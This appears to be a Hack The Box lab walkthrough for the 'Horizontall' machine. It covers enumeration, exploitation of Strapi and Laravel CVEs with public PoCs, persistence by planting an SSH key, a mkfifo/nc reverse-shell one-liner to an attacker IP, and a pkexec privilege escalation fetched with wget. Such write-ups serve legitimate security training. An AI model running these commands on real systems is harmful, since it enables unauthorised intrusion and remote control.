---
description: https://app.hackthebox.com/machines/Horizontall
---

# Horizontall

## Nmap

```
sudo nmap 10.10.11.105 -p- -sS -sV                                                                                      

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
Add horizontall.htb to /etc/hosts.
{% endhint %}

Starting out we see a custom webpage running on Nginx. After running through directory enumeration we are unable to pull any interesting results.

![](<.gitbook/assets/image (2060).png>)

Checking the network requests manually we do see some .js

![](<.gitbook/assets/image (2050).png>)

![](<.gitbook/assets/image (2067).png>)

![](<.gitbook/assets/image (2045).png>)

{% hint style="info" %}
Add api-prod.horizontall.htb to /etc/hosts.
{% endhint %}

![](<.gitbook/assets/image (2038).png>)

```
feroxbuster -u http://api-prod.horizontall.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
```

![](<.gitbook/assets/image (2055).png>)

![](<.gitbook/assets/image (2051).png>)

```bash
searchsploit -w "strapi"
```

![](<.gitbook/assets/image (2048).png>)

```bash
curl "http://api-prod.horizontall.htb/admin/init"
```

![](<.gitbook/assets/image (2054).png>)

**Exploit**

**Github:** [https://www.exploit-db.com/exploits/50239](https://www.exploit-db.com/exploits/50239) **(CVE-2019-18818, CVE-2019-19609)**&#x20;

![](<.gitbook/assets/image (2052).png>)

**Github:** [https://github.com/z9fr/CVE-2019-19609/blob/main/exploit.py](https://github.com/z9fr/CVE-2019-19609/blob/main/exploit.py) **(CVE-2019-19609)**

```
python3 exploit.py <rhost> <lhost> <jwt> <url>
python3 exploit.py api-prod.horizontall.htb 10.10.14.14 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQ0NTI2ODgzLCJleHAiOjE2NDcxMTg4ODN9.2t51kjz4yTrHHUYHG3Ag799fLWiHLspwzccAX5bdsW0 http://api-prod.horizontall.htb/
```

![](<.gitbook/assets/image (2042).png>)

![](<.gitbook/assets/image (2053).png>)

**SSH**

For `SSH` access create a .ssh directory in the _strapi_ user home location and generate an `SSH` key and an authorized\_keys file.

```bash
# Create .ssh folder in /opt/strapi
mkdir /opt/strapi/.ssh

# Generate SSH key
ssh-keygen #Hit enter until complete

# Create authorized_keys file
touch authorized_keys

# echo contnets of id_rsa.pub into authorized_keys
echo "<Contents of id_rsa.pub>" > authroized_keys

# Next, copy id_rsa to the attacking system and SSH in as the strapi user.
ssh -i id_rsa strapi@10.10.11.105
```

![](<.gitbook/assets/image (2039).png>)

![](<.gitbook/assets/image (2056).png>)

Checking out what is running on the local ports with `curl` we see that under port 8000 Laravel v8 is running.

![](<.gitbook/assets/image (2041).png>)

![](<.gitbook/assets/image (2063).png>)

**SSH forward remote port to local port**&#x20;

```bash
ssh -i id_rsa strapi@10.10.11.105 -L 8000:127.0.0.1:8000
```

![](<.gitbook/assets/image (2043).png>)

**Searchsploit show Laravel v8 is vulnerable to RCE.**

![](<.gitbook/assets/image (2068).png>)

I did not have much luck with the searchsploit suggested PoC. However the PoC linked below worked much better.

**Github:** [https://github.com/nth347/CVE-2021-3129\_exploit](https://github.com/nth347/CVE-2021-3129\_exploit)

**Usage:**

```
git clone https://github.com/nth347/CVE-2021-3129_exploit.git
cd CVE-2021-3129_exploit
chmod +x exploit.py
./exploit.py http://localhost:8000 Monolog/RCE3 id
```

A reverse shell can be obtained with the following as `nc` is installed on the target system.

```bash
./exploit.py 'http://localhost:8000' Monolog/RCE2 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 9000 >/tmp/f"
```

![](<.gitbook/assets/image (2044).png>)

**Exploit #2 CVE-2021-4034**

![](<.gitbook/assets/image (2040).png>)

**Github:** [https://github.com/arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034) **(CVE-2021-4034)**&#x20;

Download the exploit PoC to the target system, compile and execute.

```bash
wget 'http://<IP>/poc.c'
gcc 'poc.c' -o 'exploit'
chmod +x ./exploit
./exploit
```

![](<.gitbook/assets/image (2057).png>)
